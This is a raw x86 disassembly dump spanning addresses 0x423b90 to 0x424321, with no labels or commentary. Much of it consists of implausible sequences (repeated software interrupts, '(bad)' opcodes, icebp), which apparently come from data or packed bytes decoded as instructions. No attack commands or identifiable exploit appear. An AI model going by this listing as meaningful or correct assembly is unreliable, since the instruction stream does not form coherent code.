  423b90:	shr    ebx,cl
  423b92:	xchg   edx,eax
  423b93:	shr    edx,cl
  423b95:	sub    BYTE PTR [ebx+0x13],dl
  423b98:	jno    0x423b67
  423b9a:	lea    esi,[ebp+0x3bb596cd]
  423ba0:	or     al,0x3b
  423ba2:	cdq    
  423ba3:	shr    ebx,cl
  423ba5:	xchg   edx,eax
  423ba6:	shr    edx,cl
  423ba8:	sub    BYTE PTR [ebx+0x13],dl
  423bab:	jno    0x423bad
  423bad:	(bad)  
  423bae:	lods   eax,DWORD PTR ds:[esi]
  423baf:	add    BYTE PTR [eax+0x1c],dh
  423bb2:	int    0x76
  423bb4:	std    
  423bb5:	or     dh,BYTE PTR [esi+0x1d]
  423bb8:	int    0x76
  423bba:	jne    0x423bc6
  423bbc:	out    0x55,al
  423bbe:	or     dh,BYTE PTR [esi-0x30]
  423bc1:	leave  
  423bc2:	jbe    0x423b61
  423bc4:	inc    ecx
  423bc5:	and    DWORD PTR [esi+0x5576cd35],eax
  423bcb:	int    0x8d
  423bcd:	push   ebp
  423bce:	cmp    edi,DWORD PTR [ecx+0x3b]
  423bd1:	or     al,0xd3
  423bd3:	lods   eax,DWORD PTR ds:[esi]
  423bd4:	sub    bl,dl
  423bd6:	jmp    0x423b6a
  423bd8:	push   ebx
  423bd9:	ror    DWORD PTR [edx],cl
  423bdb:	jbe    0x423c22
  423bdd:	int    0x76
  423bdf:	push   ebp
  423be0:	int    0x8d
  423be2:	push   ebp
  423be3:	cmp    edi,DWORD PTR [ecx+0x3b]
  423be6:	or     al,0xd3
  423be8:	lods   eax,DWORD PTR ds:[esi]
  423be9:	sub    bl,dl
  423beb:	jmp    0x423b7f
  423bed:	push   ebx
  423bee:	ror    DWORD PTR [edx],cl
  423bf0:	jbe    0x423bff
  423bf2:	leave  
  423bf3:	jbe    0x423b8a
  423bf5:	dec    eax
  423bf6:	and    DWORD PTR [esi-0x528936cb],eax
  423bfc:	ret    0x8621
  423bff:	xor    eax,0xcd5576cd
  423c04:	lea    edx,[ebp+0x3b]
  423c07:	jns    0x423c44
  423c09:	or     al,0xd3
  423c0b:	jmp    0x423b9f
  423c0d:	shr    DWORD PTR [ebp-0x322cacd8],cl
  423c13:	lea    ebx,ds:0x52f7d43
  423c19:	push   ss
  423c1a:	xchg   DWORD PTR [eax-0x6d241480],eax
  423c20:	add    BYTE PTR [eax-0x326a7233],0x76
  423c27:	xchg   ebp,eax
  423c28:	int    0x96
  423c2a:	inc    ebp
  423c2b:	cmp    eax,ebp
  423c2d:	cmp    ecx,DWORD PTR [edi]
  423c2f:	sar    DWORD PTR [ebp+0x28f2d392],cl
  423c35:	push   ebx
  423c36:	jge    0x423c05
  423c38:	jbe    0x423c57
  423c3a:	xor    edx,edx
  423c3c:	cmp    ebx,edx
  423c3e:	clc    
  423c3f:	add    cl,BYTE PTR [edx]
  423c41:	jbe    0x423c50
  423c43:	int    0x76
  423c45:	lods   eax,DWORD PTR ds:[esi]
  423c46:	int    0x8d
  423c48:	lods   eax,DWORD PTR ds:[esi]
  423c49:	cmp    edi,DWORD PTR [ecx+0x3b]
  423c4c:	or     al,0xd3
  423c4e:	jmp    0x423be2
  423c50:	shr    DWORD PTR [ebp-0x322cacd8],cl
  423c56:	lea    ecx,ds:0x16d87d43
  423c5c:	int    0x76
  423c5e:	lods   eax,DWORD PTR ds:[esi]
  423c5f:	int    0x8d
  423c61:	lods   eax,DWORD PTR ds:[esi]
  423c62:	cmp    edi,DWORD PTR [ecx+0x3b]
  423c65:	or     al,0xd3
  423c67:	lods   eax,DWORD PTR ds:[esi]
  423c68:	sub    bl,dl
  423c6a:	jmp    0x423bfe
  423c6c:	push   ebx
  423c6d:	ror    DWORD PTR [edx],cl
  423c6f:	jbe    0x423c7e
  423c71:	int    0x76
  423c73:	xchg   ebp,eax
  423c74:	int    0x8d
  423c76:	xchg   ebp,eax
  423c77:	cmp    edi,DWORD PTR [ecx+0x3b]
  423c7a:	or     al,0xd3
  423c7c:	lods   eax,DWORD PTR ds:[esi]
  423c7d:	sub    bl,dl
  423c7f:	jmp    0x423c13
  423c81:	push   ebx
  423c82:	ror    ebp,cl
  423c84:	lea    ecx,ds:0xad3d12f
  423c8a:	jbe    0x423c99
  423c8c:	int    0x76
  423c8e:	push   ebp
  423c8f:	int    0x8d
  423c91:	push   ebp
  423c92:	cmp    edi,DWORD PTR [ecx+0x3b]
  423c95:	or     al,0xd3
  423c97:	jmp    0x423c2b
  423c99:	shr    DWORD PTR [ebp-0x322cacd8],cl
  423c9f:	lea    ecx,ds:0x52f7d43
  423ca5:	pusha  
  423ca6:	xchg   edx,eax
  423ca7:	add    BYTE PTR [eax+0xa0d76cd],0x76
  423cae:	or     eax,0x874576cd
  423cb3:	jbe    0x423c85
  423cb5:	or     ah,dh
  423cb7:	cmp    eax,0x5d5d760a
  423cbc:	inc    ecx
  423cbd:	and    DWORD PTR [esi+0x6d760a35],eax
  423cc3:	leave  
  423cc4:	jbe    0x423d2b
  423cc6:	cmp    DWORD PTR [ecx],esp
  423cc8:	xchg   BYTE PTR ds:0xb22576c9,dh
  423cce:	and    DWORD PTR [esi-0xe89f5cb],eax
  423cd4:	int    0x76
  423cd6:	cmp    eax,0x3b3d8dcd
  423cdb:	jns    0x423d18
  423cdd:	or     al,0xd3
  423cdf:	lods   eax,DWORD PTR ds:[esi]
  423ce0:	sub    bl,dl
  423ce2:	jmp    0x423c76
  423ce4:	push   ebx
  423ce5:	ror    DWORD PTR [edx],cl
  423ce7:	jbe    0x423d66
  423ce9:	int    0x6d
  423ceb:	jmp    0x423cf3
  423ced:	add    DWORD PTR [eax-0x36923280],0x8c06
  423cf7:	add    BYTE PTR [ebx],cl
  423cf9:	and    DWORD PTR [esi-0x369232cb],eax
  423cff:	push   es
  423d00:	jl     0x423d02
  423d02:	add    BYTE PTR [eax],al
  423d04:	mul    DWORD PTR [ecx]
  423d06:	xchg   BYTE PTR ds:0x6dcd6dcd,dh
  423d0c:	int    0x76
  423d0e:	icebp  
  423d0f:	int    0x8d
  423d11:	icebp  
  423d12:	cmp    edi,DWORD PTR [ecx+0x3b]
  423d15:	or     al,0xd3
  423d17:	lods   eax,DWORD PTR ds:[esi]
  423d18:	sub    bl,dl
  423d1a:	jmp    0x423cae
  423d1c:	push   ebx
  423d1d:	ror    ebp,cl
  423d1f:	lea    edi,[ebp+0x2f]
  423d22:	rcl    ebx,1
  423d24:	int    0x8d
  423d26:	pop    ebp
  423d27:	retf   0x8884
  423d2a:	or     DWORD PTR [esi-0x1f],esi
  423d2d:	int    0x6d
  423d2f:	int    0x76
  423d31:	icebp  
  423d32:	int    0x8d
  423d34:	icebp  
  423d35:	cmp    ecx,DWORD PTR [ebx+edi*1]
  423d38:	jns    0x423d0d
  423d3a:	jmp    0x423cce
  423d3c:	shr    DWORD PTR [ebp-0x322cacd8],cl
  423d42:	lea    edi,[ebp+0x2f]
  423d45:	rcl    ebx,1
  423d47:	int    0x8d
  423d49:	gs int 0x96
  423d4c:	cmp    ecx,DWORD PTR gs:[edi]
  423d4f:	cmp    edx,ebp
  423d51:	shl    edx,cl
  423d53:	sub    bl,dl
  423d55:	repz xchg edx,eax
  423d57:	push   ebx
  423d58:	adc    eax,DWORD PTR [edi+0x5d8dcdd3]
  423d5e:	das    
  423d5f:	pop    ecx
  423d60:	dec    esp
  423d61:	mov    ch,cl
  423d63:	push   es
  423d64:	mov    WORD PTR [eax],es
  423d66:	add    BYTE PTR [eax],al
  423d68:	int    0x17
  423d6a:	mov    WORD PTR [eax],es
  423d6c:	add    BYTE PTR [eax],al
  423d6e:	cmp    edi,DWORD PTR [ecx+0x3b]
  423d71:	aad    0xd3
  423d73:	lods   eax,DWORD PTR ds:[esi]
  423d74:	sub    bl,dl
  423d76:	repz xchg edx,eax
  423d78:	push   ebx
  423d79:	rol    BYTE PTR [edi-0x72a6d02d],cl
  423d7f:	loope  0x423dbc
  423d81:	jge    0x423d8c
  423d83:	(bad)  
  423d84:	loope  0x423d53
  423d86:	ins    DWORD PTR es:[edi],dx
  423d87:	retf   0xe176
  423d8a:	int    0x8d
  423d8c:	icebp  
  423d8d:	int    0x96
  423d8f:	icebp  
  423d90:	cmp    ecx,DWORD PTR [edi]
  423d92:	cmp    edx,ebp
  423d94:	shl    ebx,cl
  423d96:	xchg   edx,eax
  423d97:	shl    edx,cl
  423d99:	sub    BYTE PTR [ebx+0x13],dl
  423d9c:	int    0x96
  423d9e:	jge    0x423dcf
  423da0:	rcl    DWORD PTR [ebx],1
  423da2:	int    0x96
  423da4:	pop    ebp
  423da5:	or     DWORD PTR [ecx+esi*1+0x76cd6dcd],eax
  423dac:	icebp  
  423dad:	int    0x8d
  423daf:	icebp  
  423db0:	cmp    edi,DWORD PTR [ecx+0x3b]
  423db3:	or     al,0xd3
  423db5:	lods   eax,DWORD PTR ds:[esi]
  423db6:	sub    bl,dl
  423db8:	jmp    0x423d4c
  423dba:	push   ebx
  423dbb:	ror    ebp,cl
  423dbd:	lea    edi,[ebp+0x2f]
  423dc0:	rcl    ebx,1
  423dc2:	int    0x8d
  423dc4:	pop    ebp
  423dc5:	retf   0x8884
  423dc8:	or     DWORD PTR [esi-0x1f],esi
  423dcb:	int    0x6d
  423dcd:	int    0x76
  423dcf:	icebp  
  423dd0:	int    0x8d
  423dd2:	icebp  
  423dd3:	cmp    edi,DWORD PTR [ecx-0x2d]
  423dd6:	lods   eax,DWORD PTR ds:[esi]
  423dd7:	sub    BYTE PTR [ebx],bh
  423dd9:	or     al,0xd3
  423ddb:	jmp    0x423d6f
  423ddd:	push   ebx
  423dde:	ror    ebp,cl
  423de0:	lea    edi,[ebp+0x2f]
  423de3:	rcl    ebx,1
  423de5:	int    0x8d
  423de7:	ins    DWORD PTR es:[edi],dx
  423de8:	int    0x96
  423dea:	ins    DWORD PTR es:[edi],dx
  423deb:	cmp    ecx,DWORD PTR [edi]
  423ded:	cmp    edx,ebp
  423def:	shl    edx,cl
  423df1:	sub    bl,dl
  423df3:	repz xchg edx,eax
  423df5:	push   ebx
  423df6:	adc    eax,DWORD PTR [edi+0x5d8dcdd3]
  423dfc:	das    
  423dfd:	pop    ecx
  423dfe:	dec    esp
  423dff:	mov    ch,cl
  423e01:	push   es
  423e02:	jl     0x423e04
  423e04:	add    BYTE PTR [eax],al
  423e06:	int    0x17
  423e08:	jl     0x423e0a
  423e0a:	add    BYTE PTR [eax],al
  423e0c:	cmp    edi,DWORD PTR [ecx+0x3b]
  423e0f:	aad    0xd3
  423e11:	lods   eax,DWORD PTR ds:[esi]
  423e12:	sub    bl,dl
  423e14:	repz xchg edx,eax
  423e16:	push   ebx
  423e17:	rol    BYTE PTR [edi-0x72a6d02d],cl
  423e1d:	loope  0x423e5a
  423e1f:	jge    0x423e2a
  423e21:	(bad)  
  423e22:	loope  0x423df1
  423e24:	ins    DWORD PTR es:[edi],dx
  423e25:	retf   0xe176
  423e28:	int    0x8d
  423e2a:	icebp  
  423e2b:	int    0x96
  423e2d:	icebp  
  423e2e:	cmp    ecx,DWORD PTR [edi]
  423e30:	cmp    edx,ebp
  423e32:	shl    ebx,cl
  423e34:	xchg   edx,eax
  423e35:	shl    edx,cl
  423e37:	sub    BYTE PTR [ebx+0x13],dl
  423e3a:	int    0x96
  423e3c:	jge    0x423e6d
  423e3e:	rcl    DWORD PTR [ebx],1
  423e40:	int    0x96
  423e42:	pop    ebp
  423e43:	or     DWORD PTR [ecx+esi*1+0x76cd6dcd],eax
  423e4a:	and    eax,0x3b258dcd
  423e4f:	or     al,0x3b
  423e51:	jns    0x423e26
  423e53:	jmp    0x423de7
  423e55:	shr    DWORD PTR [ebp-0x322cacd8],cl
  423e5b:	lea    ebp,[ebp-0x33]
  423e5e:	xchg   esi,eax
  423e5f:	ins    DWORD PTR es:[edi],dx
  423e60:	cmp    ecx,DWORD PTR [edi]
  423e62:	cmp    edx,ebp
  423e64:	shl    edx,cl
  423e66:	sub    bl,dl
  423e68:	repz xchg edx,eax
  423e6a:	push   ebx
  423e6b:	adc    ebp,DWORD PTR [edi]
  423e6d:	rcl    ebx,1
  423e6f:	xchg   DWORD PTR [esi+0x7d],esi
  423e72:	or     dh,BYTE PTR [esi+0x7d]
  423e75:	int    0x76
  423e77:	jge    0x423e46
  423e79:	lea    ecx,ds:0xb2f7d43
  423e7f:	(bad)  
  423e80:	inc    DWORD PTR [eax]
  423e82:	add    ch,cl
  423e84:	jbe    0x423ef3
  423e86:	int    0x8d
  423e88:	ins    DWORD PTR es:[edi],dx
  423e89:	cmp    ecx,DWORD PTR [ebx+edx*8]
  423e8c:	jmp    0x423e20
  423e8e:	cmp    edi,DWORD PTR [ecx-0x2d]
  423e91:	lods   eax,DWORD PTR ds:[esi]
  423e92:	sub    BYTE PTR [ebx-0x2d],dl
  423e95:	int    0x8d
  423e97:	or     eax,0xcdd3d12f
  423e9c:	lea    edi,ds:0xf2d30f3b
  423ea2:	sub    BYTE PTR [ebx-0x2d],dl
  423ea5:	int    0x8d
  423ea7:	cmp    eax,0xebd30c3b
  423eac:	xchg   edx,eax
  423ead:	push   ebx
  423eae:	ror    DWORD PTR [edx],cl
  423eb0:	jbe    0x423f17
  423eb2:	int    0x76
  423eb4:	popf   
  423eb5:	int    0x8d
  423eb7:	popf   
  423eb8:	cmp    ecx,DWORD PTR [ebx+edx*8]
  423ebb:	jmp    0x423e4f
  423ebd:	cmp    edi,DWORD PTR [ecx-0x2d]
  423ec0:	lods   eax,DWORD PTR ds:[esi]
  423ec1:	sub    BYTE PTR [ebx-0x2d],dl
  423ec4:	int    0x8d
  423ec6:	popf   
  423ec7:	int    0x96
  423ec9:	popf   
  423eca:	cmp    ecx,DWORD PTR [edi]
  423ecc:	shl    edx,cl
  423ece:	sub    BYTE PTR [ebx],bh
  423ed0:	aad    0xd3
  423ed2:	repz xchg edx,eax
  423ed4:	push   ebx
  423ed5:	adc    eax,DWORD PTR [edi+0x7d87658d]
  423edb:	xchg   DWORD PTR [ebp+0x458d0a45],ecx
  423ee1:	in     al,dx
  423ee2:	sbb    al,0xcd
  423ee4:	jbe    0x423e83
  423ee6:	int    0x8d
  423ee8:	popf   
  423ee9:	cmp    edi,DWORD PTR [ecx+0x3b]
  423eec:	or     al,0xd3
  423eee:	lods   eax,DWORD PTR ds:[esi]
  423eef:	sub    bl,dl
  423ef1:	jmp    0x423e85
  423ef3:	push   ebx
  423ef4:	rol    DWORD PTR [edi+0x760a4576],cl
  423efa:	inc    ebp
  423efb:	int    0x76
  423efd:	popf   
  423efe:	int    0x8d
  423f00:	popf   
  423f01:	cmp    edi,DWORD PTR [ecx-0x2d]
  423f04:	lods   eax,DWORD PTR ds:[esi]
  423f05:	sub    BYTE PTR [ebx],bh
  423f07:	or     al,0xd3
  423f09:	jmp    0x423e9d
  423f0b:	push   ebx
  423f0c:	ror    ebp,cl
  423f0e:	lea    ebx,ds:0x76cd7d33
  423f14:	popf   
  423f15:	int    0x96
  423f17:	popf   
  423f18:	cmp    edi,DWORD PTR [ecx+0x3b]
  423f1b:	aad    0xd3
  423f1d:	repz xchg edx,eax
  423f1f:	shr    DWORD PTR [ebp-0x322dacd8],cl
  423f25:	xchg   esi,eax
  423f26:	inc    ebp
  423f27:	das    
  423f28:	rcl    edx,1
  423f2a:	inc    ebx
  423f2b:	shr    DWORD PTR [edi],cl
  423f2d:	pop    es
  423f2e:	adc    ebp,edi
  423f30:	add    BYTE PTR [eax],al
  423f32:	int    0x76
  423f34:	mov    BYTE PTR [eax],al
  423f36:	(bad)  
  423f37:	dec    esp
  423f38:	iret   
  423f39:	jbe    0x423ef8
  423f3b:	add    dh,dl
  423f3d:	mov    BYTE PTR [eax-0x33],dh
  423f40:	jbe    0x423eca
  423f42:	int    0x1
  423f44:	xchg   ebp,eax
  423f45:	add    DWORD PTR [eax-0x32afff80],0x1cd8876
  423f4f:	icebp  
  423f50:	add    DWORD PTR [eax+0x500080],0xd600fdd6
  423f5a:	jne    0x423f19
  423f5c:	test   al,0x88
  423f5e:	add    BYTE PTR [eax-0x322f89f6],0x76
  423f65:	stc    
  423f66:	int    0x8d
  423f68:	stc    
  423f69:	cmp    eax,ebp
  423f6b:	cmp    ecx,DWORD PTR [edi]
  423f6d:	shl    edx,cl
  423f6f:	sub    bl,dl
  423f71:	mov    ebp,0xcdd35392
  423f76:	lea    esi,[ebp+0x43]
  423f79:	rcl    esp,cl
  423f7b:	push   esi
  423f7c:	int    0x76
  423f7e:	mov    ch,cl
  423f80:	lea    ebp,ds:0xcd2d96cd
  423f86:	add    DWORD PTR [ecx],edx
  423f88:	add    DWORD PTR [eax+0x3b0c3b80],0x92ebd399
  423f92:	shr    edx,cl
  423f94:	sub    BYTE PTR [ebx+0x13],dl
  423f97:	jno    0x423f66
  423f99:	(bad)  
  423f9a:	stc    
  423f9b:	int    0x96
  423f9d:	stc    
  423f9e:	cmp    ecx,DWORD PTR [ebx+edi*1]
  423fa1:	cdq    
  423fa2:	shr    ebx,cl
  423fa4:	xchg   edx,eax
  423fa5:	shr    edx,cl
  423fa7:	sub    BYTE PTR [ebx+0x13],dl
  423faa:	jno    0x423fac
  423fac:	(bad)  
  423fad:	jne    0x423faf
  423faf:	jo     0x423fcd
  423fb1:	stos   BYTE PTR es:[edi],al
  423fb2:	test   al,0x63
  423fb4:	retf   
  423fb5:	ror    BYTE PTR [eax-0x12326980],cl
  423fbb:	add    al,0xed
  423fbd:	and    al,0x98
  423fbf:	int    0x11
  423fc1:	int    0x12
  423fc3:	sub    eax,0x4808081
  423fc8:	pop    esp
  423fc9:	sub    BYTE PTR [edi],0x5
  423fcc:	dec    edx
  423fcd:	add    DWORD PTR [eax+0x2fda0680],0x80819205
  423fd7:	add    BYTE PTR [esi],0xf7
  423fda:	das    
  423fdb:	add    eax,0x80808003
  423fe0:	int    0x7
  423fe2:	or     DWORD PTR [eax+0x6d068080],eax
  423fe8:	das    
  423fe9:	add    eax,0x808080e9
  423fee:	add    al,0x69
  423ff0:	int3   
  423ff1:	add    BYTE PTR [eax+0x52f3080],0xe2
  423ff8:	add    BYTE PTR [eax+0x54985e80],0x2f
  423fff:	add    eax,0x808080e3
  424004:	int    0xc1
  424006:	and    eax,0x4808081
  42400b:	mov    dh,0x11
  42400d:	or     ch,0x13
  424010:	xor    ecx,DWORD PTR [esi-0x79]
  424013:	shr    BYTE PTR [edi],cl
  424015:	mov    ebx,0x8d0a4c70
  42401a:	mov    ch,0x2f
  42401c:	mov    ebx,0x13874e7c
  424021:	das    
  424022:	add    eax,0x80808049
  424027:	iret   
  424028:	jl     0x42403e
  42402a:	pop    ebx
  42402b:	or     cl,BYTE PTR [ebp+0x69bd]
  424031:	add    BYTE PTR [ebx-0x2baef966],al
  424037:	or     ebp,0x31
  42403a:	add    al,0xb6
  42403c:	cmc    
  42403d:	sub    BYTE PTR [ebx],0x99
  424040:	xchg   ecx,esi
  424042:	das    
  424043:	mov    ebx,0xbb2f4ee0
  424048:	mov    al,ds:0xd4fc874c
  42404d:	mov    esi,0xa148acf
  424052:	(bad)  
  424053:	in     eax,dx
  424054:	push   es
  424055:	push   ecx
  424056:	aam    0x6e
  424058:	int    0x89
  42405a:	add    al,0xb6
  42405c:	stc    
  42405d:	sub    BYTE PTR [ebx],0xf
  424060:	xchg   DWORD PTR [ebp+0x2f],edi
  424063:	mov    ebx,0xbb2f4ede
  424068:	sahf   
  424069:	dec    esp
  42406a:	xchg   esp,edi
  42406c:	aam    0x33
  42406e:	iret   
  42406f:	ficom  WORD PTR [edx+ecx*1]
  424072:	out    0xfd,al
  424074:	int    0xe6
  424076:	std    
  424077:	int    0x6a
  424079:	push   es
  42407a:	add    ah,dl
  42407c:	xchg   ch,cl
  42407e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42407f:	mov    ch,0x81
  424081:	and    al,0x8b
  424083:	das    
  424084:	mov    ebx,0xbb2f4ede
  424089:	sahf   
  42408a:	dec    esp
  42408b:	add    BYTE PTR [esi-0x7],dh
  42408e:	add    al,0x76
  424090:	std    
  424091:	mov    BYTE PTR [edi-0x619a104],al
  424097:	sbb    ch,0x2f
  42409a:	mov    ebx,0xbb2f4ee0
  42409f:	mov    al,ds:0xed8dcd4c
  4240a4:	add    BYTE PTR [esi-0xb],dh
  4240a7:	add    al,0xd3
  4240a9:	mov    BYTE PTR [edi-0x1272f504],al
  4240af:	pop    esi
  4240b0:	out    0xf5,al
  4240b2:	sub    BYTE PTR ds:0x2fbd8dcd,0xbb
  4240b9:	jo     0x424109
  4240bb:	das    
  4240bc:	mov    ebx,0x76004cdc
  4240c1:	adc    DWORD PTR [ebx+edx*8],eax
  4240c4:	mov    BYTE PTR [edi-0x4272f527],al
  4240ca:	pop    esi
  4240cb:	xchg   esi,eax
  4240cc:	adc    DWORD PTR [edi],ebp
  4240ce:	or     ebp,DWORD PTR [esi-0x56000000]
  4240d4:	arpl   WORD PTR [ebx],di
  4240d6:	ins    DWORD PTR es:[edi],dx
  4240d7:	ins    BYTE PTR es:[edi],dx
  4240d8:	in     al,dx
  4240d9:	xchg   edx,eax
  4240da:	cmp    ebp,DWORD PTR [ebp-0x58]
  4240dd:	retf   
  4240de:	lds    edx,FWORD PTR [esi+0xacdedcd]
  4240e4:	sub    eax,0xcd808081
  4240e9:	jbe    0x424137
  4240eb:	add    al,0xed
  4240ed:	xor    BYTE PTR [ebx+0x3b],bl
  4240f0:	fstp   QWORD PTR [eax+0x2f1e5e9a]
  4240f6:	add    eax,0x8080800b
  4240fb:	inc    ebx
  4240fc:	(bad)
  4240ff:	pop    esi
  424100:	pushf  
  424101:	(bad)  
  424103:	test   DWORD PTR [ebx],edi
  424105:	ins    DWORD PTR es:[edi],dx
  424106:	ins    BYTE PTR es:[edi],dx
  424107:	in     al,dx
  424108:	fmul   st,st(5)
  42410a:	ins    BYTE PTR es:[edi],dx
  42410b:	fadd   QWORD PTR [edi+0x7ccd8876]
  424111:	and    al,0xcd
  424113:	jo     0x424149
  424115:	int    0x90
  424117:	adc    al,0xcd
  424119:	fcomp  QWORD PTR [edi+eax*4]
  42411c:	lea    ecx,[eax+0xa889687]
  424122:	(bad)  
  424123:	std    
  424124:	inc    ebx
  424125:	clc    
  424126:	jnp    0x4240af
  424128:	or     ah,dh
  42412a:	std    
  42412b:	or     ah,BYTE PTR [esi-0x259a107]
  424131:	fsub   st,st(3)
  424133:	inc    ebx
  424134:	pushf  
  424135:	adc    al,0x77
  424137:	xchg   BYTE PTR [edi],ch
  424139:	mov    ebx,0x92eca054
  42413e:	int    0xf4
  424140:	iret   
  424141:	push   esp
  424142:	ror    ebp,0x68
  424145:	push   es
  424146:	add    ah,dl
  424148:	ds xchg esi,esp
  42414b:	mov    BYTE PTR [edx],cl
  42414d:	out    0x11,al
  42414f:	inc    ebx
  424150:	stc    
  424151:	fdiv   DWORD PTR [eax]
  424153:	int    0xa6
  424155:	dec    esp
  424156:	int    0x63
  424158:	in     al,0x87
  42415a:	popf   
  42415b:	inc    ebx
  42415c:	cld    
  42415d:	ja     0x4240e3
  42415f:	int    0x58
  424161:	in     al,dx
  424162:	mov    BYTE PTR [ebx],dh
  424164:	out    0x88,al
  424166:	or     ch,BYTE PTR [eax-0x33]
  424169:	(bad)  
  42416a:	adc    DWORD PTR [esi],eax
  42416c:	not    esp
  42416e:	dec    esi
  42416f:	int    0xa6
  424171:	stc    
  424172:	dec    ebx
  424173:	or     ah,BYTE PTR [esi-0x259bc07]
  424179:	sbb    BYTE PTR [ebp-0x14],0x8
  42417d:	cmp    ebp,DWORD PTR [ebp-0x56]
  424180:	test   al,0x63
  424182:	retf   
  424183:	ror    BYTE PTR [eax-0x12326980],cl
  424189:	add    al,0xed
  42418b:	push   eax
  42418c:	pop    ebx
  42418d:	cwde   
  42418e:	pop    ebp
  42418f:	dec    ecx
  424190:	and    DWORD PTR [esi-0x289f5cb],eax
  424196:	leave  
  424197:	jbe    0x424192
  424199:	inc    ecx
  42419a:	and    DWORD PTR [esi-0x27232cb],eax
  4241a0:	int    0xa6
  4241a2:	std    
  4241a3:	call   0x3b81:0x90cfffc0
  4241aa:	psrlq  mm5,mm3
  4241ad:	xchg   edx,eax
  4241ae:	stos   BYTE PTR es:[edi],al
  4241af:	cmp    esp,ecx
  4241b1:	shl    ebp,cl
  4241b3:	sub    BYTE PTR [ebx+0xc],dl
  4241b6:	or     cl,BYTE PTR [ebp-0x2723243]
  4241bc:	int    0x8d
  4241be:	std    
  4241bf:	int    0x8d
  4241c1:	std    
  4241c2:	int    0x8d
  4241c4:	std    
  4241c5:	int    0x8d
  4241c7:	std    
  4241c8:	int    0x8d
  4241ca:	std    
  4241cb:	int    0x8d
  4241cd:	std    
  4241ce:	int    0x8d
  4241d0:	std    
  4241d1:	int    0x8d
  4241d3:	std    
  4241d4:	int    0x8d
  4241d6:	std    
  4241d7:	leave  
  4241d8:	jbe    0x4241eb
  4241da:	fadd   st,st(5)
  4241dc:	loope  0x424233
  4241de:	int    0x8d
  4241e0:	std    
  4241e1:	int    0xa6
  4241e3:	std    
  4241e4:	cmp    esp,ecx
  4241e6:	cmp    ecx,DWORD PTR [edi]
  4241e8:	shl    ebp,cl
  4241ea:	sub    bl,dl
  4241ec:	jmp    0x424180
  4241ee:	push   ebx
  4241ef:	or     al,0xcd
  4241f1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4241f2:	dec    esp
  4241f3:	int    0x9f
  4241f5:	sub    eax,0x43808081
  4241fa:	push   ebx
  4241fb:	das    
  4241fc:	add    eax,0x80808717
  424201:	int    0x8d
  424203:	std    
  424204:	int    0xa6
  424206:	std    
  424207:	cmp    ecx,DWORD PTR [edi]
  424209:	cmp    esp,ecx
  42420b:	shr    ebx,cl
  42420d:	xchg   edx,eax
  42420e:	shl    ebp,cl
  424210:	sub    BYTE PTR [ebx+0xc],dl
  424213:	inc    ebx
  424214:	adc    ebp,DWORD PTR [edi]
  424216:	add    eax,0x8080877f
  42421b:	int    0xca
  42421d:	add    DWORD PTR [eax-0x69327f80],eax
  424223:	std    
  424224:	int    0xa6
  424226:	std    
  424227:	cmp    ebx,DWORD PTR [ecx-0xc2c1ec5]
  42422d:	xchg   edx,eax
  42422e:	shl    ebp,cl
  424230:	sub    BYTE PTR [ebx-0x2b],dl
  424233:	inc    ebx
  424234:	adc    ebp,DWORD PTR [edi]
  424236:	add    eax,0x8080875b
  42423b:	xchg   DWORD PTR [ebp-0xe72f578],ecx
  424241:	int    0xf1
  424243:	cmp    ebx,DWORD PTR [ecx-0x1ec46233]
  424249:	shl    ebx,cl
  42424b:	xchg   edx,eax
  42424c:	shl    ebp,cl
  42424e:	sub    BYTE PTR [ebx-0x2b],dl
  424251:	or     dl,BYTE PTR [esi+0x1196cd11]
  424257:	inc    ebx
  424258:	icebp  
  424259:	aam    0x26
  42425b:	int    0x76
  42425d:	std    
  42425e:	int    0x96
  424260:	std    
  424261:	cmp    ebx,ecx
  424263:	cmp    edi,DWORD PTR [ecx-0x2d]
  424266:	jmp    0xd253:0x92bdd328
  42426d:	int    0x96
  42426f:	adc    DWORD PTR [ebx-0x26],esi
  424272:	adc    al,0x5e
  424274:	test   BYTE PTR [edx-0x2a],cl
  424277:	xor    cl,ch
  424279:	jbe    0x424278
  42427b:	int    0x96
  42427d:	std    
  42427e:	cmp    ebx,ecx
  424280:	cmp    edi,DWORD PTR [ecx-0x2d]
  424283:	jmp    0xd253:0x92bdd328
  42428a:	int    0x96
  42428c:	adc    DWORD PTR [ebx-0x26],esi
  42428f:	adc    al,0x5e
  424291:	je     0x4242dd
  424293:	xor    BYTE PTR [edi],ch
  424295:	add    eax,0x808092df
  42429a:	int    0x76
  42429c:	std    
  42429d:	int    0x76
  42429f:	std    
  4242a0:	int    0xa6
  4242a2:	std    
  4242a3:	int    0x76
  4242a5:	std    
  4242a6:	cmp    ecx,ecx
  4242a8:	cmp    ebp,DWORD PTR [ecx-0x2cd7522d]
  4242ae:	in     al,dx
  4242af:	xchg   edx,eax
  4242b0:	push   ebx
  4242b1:	popf   
  4242b2:	int    0x76
  4242b4:	adc    DWORD PTR [ebx+0x6d],esi
  4242b7:	adc    al,0x87
  4242b9:	ror    ebp,cl
  4242bb:	jl     0x4242ed
  4242bd:	xchg   DWORD PTR [ebp-0x5272f578],ecx
  4242c3:	int    0x8d
  4242c5:	std    
  4242c6:	int    0x96
  4242c8:	std    
  4242c9:	cmp    ecx,DWORD PTR [edi]
  4242cb:	cmp    ebx,ecx
  4242cd:	shr    ebx,cl
  4242cf:	xchg   edx,eax
  4242d0:	shr    edx,cl
  4242d2:	sub    BYTE PTR [ebx+0x13],dl
  4242d5:	int    0x96
  4242d7:	std    
  4242d8:	or     cl,BYTE PTR [ebp+0xa88cd95]
  4242de:	lea    esi,[ebp+0x3bfd8dcd]
  4242e4:	cdq    
  4242e5:	cmp    esi,eax
  4242e7:	shl    edx,cl
  4242e9:	sub    bl,dl
  4242eb:	repz xchg edx,eax
  4242ed:	push   ebx
  4242ee:	jecxz  0x4242bd
  4242f0:	lea    esi,[ebp-0x792becbd]
  4242f6:	xchg   DWORD PTR [ebp-0x6a72f578],ecx
  4242fc:	int    0x8d
  4242fe:	std    
  4242ff:	int    0x96
  424301:	std    
  424302:	cmp    ecx,DWORD PTR [edi]
  424304:	cmp    ebx,ecx
  424306:	shr    ebx,cl
  424308:	xchg   edx,eax
  424309:	shr    edx,cl
  42430b:	sub    BYTE PTR [ebx+0x13],dl
  42430e:	xchg   DWORD PTR [esp+ecx*2-0x37],edi
  424312:	jbe    0x4242b1
  424314:	popa   
  424315:	and    DWORD PTR [esi-0x777278cb],eax
  42431b:	or     cl,BYTE PTR [ebp-0x32781313]
  424321:	(bad)  
